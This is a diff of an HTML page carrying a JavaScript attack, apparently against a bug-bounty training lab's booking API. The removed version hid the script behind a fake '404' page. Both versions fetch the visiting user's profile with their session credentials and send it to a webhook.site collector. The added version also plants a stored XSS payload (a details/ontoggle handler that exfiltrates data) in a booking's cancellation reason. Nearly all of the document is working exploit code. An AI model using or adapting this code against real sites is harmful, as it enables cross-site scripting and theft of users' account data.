@@ -1,48 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Maintenance</title></head>
 <body>
     <script>
         const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
         const api = "https://api-bugbounty-exam.hashacademy.co/api";
-        const myBookingId = "69dc1bd2d9d06cf59692979e";
+        // USE YOUR NEW ACTIVE CAR ID HERE
+        const activeBookingId = "69dc1bd2d9d06cf59692979e"; 
 
-        async function executeExploit() {
-            // 1. Immediate Ping to Webhook
-            new Image().src = `${logger}/?visit=bot_triggered&ts=${Date.now()}`;
+        async function pwn() {
+            // 1. Try to fetch the bot's ACTUAL profile info
+            // Based on common patterns in this lab, try /auth/user
+            try {
+                const res = await fetch(api + "/auth/user", { credentials: "include" });
+                const data = await res.json();
+                new Image().src = `${logger}/?profile_leak=${btoa(JSON.stringify(data))}`;
+            } catch (e) {}
 
-            const endpoints = ["/auth/me", "/auth/profile", "/users/me"];
-            let flagData = "";
-
-            for (let path of endpoints) {
-                try {
-                    const res = await fetch(api + path, { credentials: "include" });
-                    if (res.ok) {
-                        const json = await res.json();
-                        flagData = JSON.stringify(json);
-                        
-                        // Send found data to Webhook via Image (Bypasses many CSPs)
-                        new Image().src = `${logger}/?path=${path}&data=${btoa(flagData)}`;
-                        
-                        // 2. BACKUP: Write the data into YOUR profile name
-                        // This allows you to see the flag just by refreshing your dashboard
-                        await fetch(api + "/auth/profile", {
-                            method: "PATCH",
-                            headers: { "Content-Type": "application/json" },
-                            credentials: "include",
-                            body: JSON.stringify({ 
-                                "fullName": "PWN_" + flagData.substring(0, 20),
-                                "address": { "street": flagData.substring(0, 100) }
-                            })
-                        });
-                    }
-                } catch (e) {}
-            }
+            // 2. Inject the XSS into the ACTIVE booking
+            // This ensures the 'status' error doesn't happen
+            try {
+                const xss = `<details open ontoggle="fetch('${api}/auth/user').then(r=>r.text()).then(t=>fetch('${logger}/?flag='+btoa(t)))">`;
+                await fetch(`${api}/bookings/${activeBookingId}/cancel`, {
+                    method: "PUT",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({ "reason": xss })
+                });
+            } catch (e) {}
         }
-
-        executeExploit();
+        pwn();
     </script>
-    <h1>Error 404</h1>
-    <p>Resource not found.</p>
 </body>
 </html>
